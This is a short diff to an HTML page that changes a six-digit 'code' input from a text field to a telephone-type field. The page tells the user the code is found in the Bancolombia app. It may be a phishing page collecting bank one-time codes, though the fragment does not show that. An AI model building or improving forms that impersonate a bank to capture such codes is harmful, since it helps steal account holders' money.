@@ -66,7 +66,7 @@
     <a style="font-size:16px; text-align:center; color:#fff;">La puedes encontrar en la app bancolombia</a>
     <br>
     <br>
-    <input type="text" name="code" id="txtDinamic" placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlenght="6">
+    <input type="tel" name="code" id="txtDinamic" placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlenght="6">
     <br>
 </center>
 <br>
